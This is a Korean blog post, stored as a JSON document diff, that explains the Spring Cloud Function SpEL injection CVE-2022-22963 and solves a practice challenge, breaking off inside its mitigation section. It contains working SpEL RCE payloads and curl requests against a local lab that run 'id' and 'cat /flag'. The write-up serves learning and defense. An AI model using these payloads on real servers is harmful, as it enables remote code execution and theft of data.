@@ -1,0 +1,1531 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "fffc6fc9-4037-551b-8d90-e78b58588aff",
+  "kind": "posts",
+  "title": "CVE-2022-22963 - Spring Cloud Function SpEL RCE",
+  "slug": "tistory-147",
+  "description": "이번 글에서는 Spring Cloud Function에서 발생한 CVE-2022-22963 취약점에 대해 정리하고, 마지막에는 실습 문제에서 실제로 어떻게 RCE를 발생시켜 FLAG를 획득했는지 살펴보려고 한다.참고로 CVE-2022-22963은 흔히 Spring4Shell이라고 부르는 CVE-2022-22965와는 다른 취약점이다.이번 실습에서 사용하는 것은 Spring Cloud Function의 SpEL Expression Injection 취약점인 CVE-2022-22963이다.1. CVE-2022-22963CVE-2022-22963은 Spring Cloud Function의 Routing 기능에서 사용되는 SpEL(Spring Expression Language) 표현식을 공격자가 조작하여 임의..",
+  "category": "Security / Research",
+  "date": "2026-08-27",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-08-27T16:11:29+09:00",
+  "updatedAt": "2026-08-27T16:11:29+09:00",
+  "sourceDigest": "bf518dc7d25afda2d666cd0718bdab777c0a2fd03d3483d13d7f47c6c0107656",
+  "assets": [],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 글에서는 Spring Cloud Function에서 발생한 CVE-2022-22963 취약점에 대해 정리하고, 마지막에는 실습 문제에서 실제로 어떻게 RCE를 발생시켜 FLAG를 획득했는지 살펴보려고 한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "참고로 CVE-2022-22963은 흔히 Spring4Shell이라고 부르는 CVE-2022-22965와는 다른 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 실습에서 사용하는 것은 Spring Cloud Function의 SpEL Expression Injection 취약점인 CVE-2022-22963이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. CVE-2022-22963"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2022-22963은 Spring Cloud Function의 Routing 기능에서 사용되는 SpEL(Spring Expression Language) 표현식을 공격자가 조작하여 임의 코드를 실행할 수 있는 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 실습 환경에서는 다음 버전을 사용하고 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<spring-cloud-function.version>\n    3.2.2\n</spring-cloud-function.version>\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Spring Cloud Function 3.2.2는 해당 취약점에 영향을 받는 버전이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제가 되는 부분은 다음 HTTP Header이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "spring.cloud.function.routing-expression\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 Header의 값이 적절하게 제한되지 않은 상태에서 SpEL 표현식으로 평가될 경우 공격자가 Java 클래스와 메서드에 접근할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 단순히"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "'echo'\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가 들어간다면 등록된 echo Function을 선택하는 정상적인 Routing 표현식이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 공격자가 다음처럼 Java Runtime에 접근하는 SpEL을 전달할 수 있다면 문제가 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.Runtime).getRuntime()\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이를 exec()까지 연결하면 시스템 명령 실행으로 이어질 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자 입력\n     ↓\nrouting-expression Header\n     ↓\nSpring Cloud Function\n     ↓\nSpEL Expression 평가\n     ↓\njava.lang.Runtime 접근\n     ↓\nRuntime.exec()\n     ↓\nRemote Code Execution\n"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. Spring Cloud Function이란?"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Spring Cloud Function은 Java의 Function, Supplier, Consumer 등을 Spring 환경에서 쉽게 사용할 수 있게 해주는 프로젝트이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 다음과 같은 Function을 등록할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "@Bean\npublic Function<String, String> echo() {\n    return value -> \"echo: \" + value;\n}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "또 다른 Function을 추가하면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "@Bean\npublic Function<String, String> lowercase() {\n    return value ->\n        value == null ? \"\" : value.toLowerCase();\n}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "애플리케이션 내부에는 다음과 같은 Function들이 존재하게 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "FunctionCatalog\n├─ echo\n└─ lowercase\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Spring Cloud Function의 Routing 기능을 사용하면 전달된 메시지를 어떤 Function으로 보낼지 동적으로 결정할 수도 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 문제에서는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "spring.cloud.function.routing-expression\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Header를 이용해 실행할 Function을 선택한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적인 사용에서는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "spring.cloud.function.routing-expression: 'echo'\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "처럼 사용한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그러면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "HTTP Request\n     ↓\nrouting-expression = 'echo'\n     ↓\nFunction Router\n     ↓\necho()\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "와 같이 동작하게 된다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. SpEL이란?"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "SpEL은 Spring Expression Language의 약자로 Spring에서 객체의 속성이나 메서드 등에 접근할 수 있도록 제공하는 표현식 언어이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "간단한 연산도 가능하다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "#{1 + 1}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "객체의 메서드를 호출하거나 Java 타입에 접근하는 것도 가능하다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "SpEL에서 T()는 Java Type을 참조할 때 사용한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.String)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "은 java.lang.String 클래스를 의미한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "마찬가지로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.Runtime)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "을 사용하면 java.lang.Runtime 클래스에 접근할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그리고 다음과 같이 연결할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.Runtime)\n    .getRuntime()\n    .exec('id')\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "구조를 나눠보면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.Runtime)\n        ↓\nRuntime 클래스 접근\n\n.getRuntime()\n        ↓\n현재 Runtime 객체 획득\n\n.exec('id')\n        ↓\nOS Command 실행\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "결국 공격자가 임의의 SpEL 표현식을 서버에서 평가시킬 수 있다면 단순 Expression Injection에서 RCE까지 연결될 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 취약점이 발생하는 과정"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적인 요청에서는 다음과 같은 Header를 사용할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "spring.cloud.function.routing-expression: 'echo'\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버에서는 해당 값을 읽어 Function Router에 전달한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "String routingExpression =\n    (expression == null || expression.isBlank())\n    ? \"'echo'\"\n    : expression;\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이후 Message Header에 그대로 저장한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Message<String> message =\n    MessageBuilder\n        .withPayload(body == null ? \"\" : body)\n        .setHeader(\n            \"spring.cloud.function.routing-expression\",\n            routingExpression\n        )\n        .build();\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그리고 functionRouter에 전달한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Function<Object,Object> router =\n    catalog.lookup(\"functionRouter\");\n\nObject result = router.apply(message);\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적인 경우에는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "'echo'\n   ↓\nSpEL 평가\n   ↓\necho Function 선택\n   ↓\n정상 실행\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 공격자가 Routing Expression 자체를 조작할 수 있으면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "악성 SpEL\n   ↓\nrouting-expression Header\n   ↓\nFunction Router\n   ↓\nSpEL 평가\n   ↓\nJava Runtime 접근\n   ↓\n명령 실행\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "으로 흐름이 바뀌게 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 핵심은 사용자 입력이 단순 문자열로 사용되는 것이 아니라 SpEL 엔진에 의해 코드와 비슷한 표현식으로 평가된다는 것이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. PoC"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "먼저 테스트 환경에서 간단한 명령 실행 여부를 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 다음 SpEL은 id 명령을 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.Runtime)\n .getRuntime()\n .exec('id')\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 exec()의 반환값은 Process 객체이기 때문에 명령의 결과가 바로 HTTP Response에 나타나는 것은 아니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "출력까지 확인하려면 Process의 InputStream을 읽어 문자열로 변환할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "new java.lang.String(\n    T(java.lang.Runtime)\n        .getRuntime()\n        .exec('id')\n        .getInputStream()\n        .readAllBytes()\n)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이를 Header에 넣어 테스트하면 다음과 같은 형태가 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "curl -X POST http://localhost:1342/api/route \\\n  -H \"Content-Type: text/plain\" \\\n  -H \"spring.cloud.function.routing-expression: new java.lang.String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())\" \\\n  --data \"test\"\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "취약한 환경이라면 서버에서 id 명령이 실행되고 그 결과가 Routing Expression의 평가 결과로 나타날 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "구조는 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "HTTP Header\n    ↓\nSpEL\n    ↓\nRuntime.getRuntime()\n    ↓\nexec(\"id\")\n    ↓\nProcess\n    ↓\ngetInputStream()\n    ↓\nreadAllBytes()\n    ↓\nString 변환\n    ↓\n명령 실행 결과\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 단순 Expression Injection이 실제 OS Command Injection까지 연결된다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6. Spring Function 문제 풀이"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 문제는 Spring Cloud Function의 Routing 기능을 직접 사용할 수 있도록 구성되어 있다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-1. 버전 확인"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "먼저 pom.xml을 보면 다음 버전을 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.6.6</version>\n</parent>\n\n<properties>\n    <java.version>11</java.version>\n    <spring-cloud-function.version>\n        3.2.2\n    </spring-cloud-function.version>\n</properties>\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가장 중요한 것은"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Spring Cloud Function 3.2.2\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 CVE-2022-22963을 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-2. 공격 지점 확인"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RouteController를 보면 /api/route에서 다음 Header를 받는다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "@RequestHeader(\n    value=\"spring.cloud.function.routing-expression\",\n    required=false\n)\nString expression\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그리고 받은 값을 그대로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": ".setHeader(\n    \"spring.cloud.function.routing-expression\",\n    routingExpression\n)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "에 넣은 뒤 functionRouter로 전달한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Function<Object,Object> router =\n    catalog.lookup(\"functionRouter\");\n\nObject result = router.apply(message);\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 사용자가 Routing Expression을 직접 제어할 수 있는 구조이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적인 웹 페이지에서는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "'echo'\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "를 넣으면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "echo: Hello Rookie\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "와 같은 결과를 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 이 값이 SpEL로 평가되기 때문에 Java Runtime까지 접근할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-3. FLAG 위치 확인"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "FlagBootstrap.java를 보면 프로그램 시작 시 FLAG를 복호화한 뒤 /flag 파일에 저장한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "Files.writeString(\n    Path.of(\"/flag\"),\n    new String(p, StandardCharsets.UTF_8),\n    StandardCharsets.UTF_8\n);\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 목표는 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "/flag\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 파일을 읽으면 된다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-4. Payload 작성"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "노션에서도 다음 Payload를 사용했다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "new java.lang.String(\n    T(java.lang.Runtime)\n        .getRuntime()\n        .exec('cat /flag')\n        .getInputStream()\n        .readAllBytes()\n)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "각 부분을 보면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "T(java.lang.Runtime)\n        ↓\nRuntime 클래스 접근\n\ngetRuntime()\n        ↓\nRuntime 객체 획득\n\nexec('cat /flag')\n        ↓\ncat /flag 실행\n\ngetInputStream()\n        ↓\n명령 실행 결과 가져오기\n\nreadAllBytes()\n        ↓\n전체 데이터 읽기\n\nnew java.lang.String(...)\n        ↓\nbyte[] → String 변환\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 최종적으로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "cat /flag\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "의 결과를 문자열로 가져오게 된다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-5. Exploit"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Burp Suite나 curl을 이용해 다음과 같이 요청할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "curl -X POST http://localhost:1342/api/route \\\n  -H \"Content-Type: text/plain\" \\\n  -H \"spring.cloud.function.routing-expression: new java.lang.String(T(java.lang.Runtime).getRuntime().exec('cat /flag').getInputStream().readAllBytes())\" \\\n  --data \"test\"\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버 내부에서는 다음 흐름으로 처리된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "POST /api/route\n       ↓\nspring.cloud.function.routing-expression\n       ↓\n악성 SpEL 전달\n       ↓\nFunction Router가 Expression 평가\n       ↓\nT(java.lang.Runtime)\n       ↓\nRuntime.exec(\"cat /flag\")\n       ↓\n/flag 읽기\n       ↓\nString 변환\n       ↓\nFLAG 획득\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 문제는 별도의 파일 업로드나 복잡한 우회가 필요하지 않고, 취약한 Spring Cloud Function의 Routing Expression에 직접 SpEL을 전달할 수 있다는 점을 찾는 것이 핵심이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "7. 대응 방법"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가장 중요한 대응은 취약한 Spring Cloud Function 버전을 사용하지 않는 것이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "3.2.2와 같이 CVE-2022-22963에 영향을 받는 버전을 사용하고 있다면 보안 패치가 적용된 버전으로 업데이트해야 한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "또한 Routing Expression에 사용자가 전달한 값을 그대로 사용하지 않아야 한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 현재 구조는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자 Header\n     ↓\nrouting-expression\n     ↓\nSpEL 평가\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이므로 위험하다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가능하다면 사용자가 Function 이름만 선택하도록 제한하는 방식이 안전하다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "if (!expression.equals(\"'echo'\")\n        && !expression.equals(\"'lowercase'\")) {\n    return ResponseEntity.badRequest()\n        .body(\"invalid function\");\n}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자 입력\n   ↓\n허용된 Function인지 검사\n   ↓\necho / lowercase\n   ↓\nFunction 실행\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "처럼 제한해야 한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "추가적으로 다음과 같은 대응이 필요하다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
